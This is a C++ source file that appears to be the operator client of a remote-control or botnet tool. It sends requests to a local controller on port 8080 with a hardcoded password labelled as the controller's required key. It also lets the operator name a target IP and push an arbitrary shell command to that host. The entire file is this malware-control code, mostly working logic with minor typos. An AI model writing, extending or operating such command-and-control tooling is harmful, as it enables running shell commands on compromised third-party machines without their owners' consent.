#include <iostream>
#include "control_socket.h"
#include "Protocol.h"
#include <string.h>

int main() {
    Csocket C_socket("127.0.0.1",8080);
    CProtocol pr;

    while (true)
    {   map<string,string> dt;
        string url;
        cout<<"url:";
        cin>>url;
        dt["url"]=url;
        dt["hax"] = "hax123412312321"; //控制端必须的密码
        if(url=="to")
        {
            string ip;
            cout<<"ip:";
            cin>>ip;
            dt["to"]=ip;
            string inst_type;
            cout<<"inst_type";
            cin>>inst_type;
            dt["inst_type"] = inst_type;
            if(inst_type=="shell")
            {
                string commd;
                cout<<"coomd:";
                cin>>commd;
                dt["command"] =commd;
            }


        }
        string req = pr.structure(dt);
        C_socket.socket_send((char *) req.c_str());
        C_socket.sokcet_recv();
    }
        cin.get();

//    string text="aaaa:aaaaa\ndsd:sdsd\n<-suoyuzhif->";
//    map<string,string> map1=pr.analysis(text);
//    map<string,string>::iterator ite;
//    for(ite=map1.begin();ite!=map1.end();ite++)
//    {
//        cout<<"back:"<<ite->first<<"end:"<<ite->second<<endl;
//    }
    return 0;
}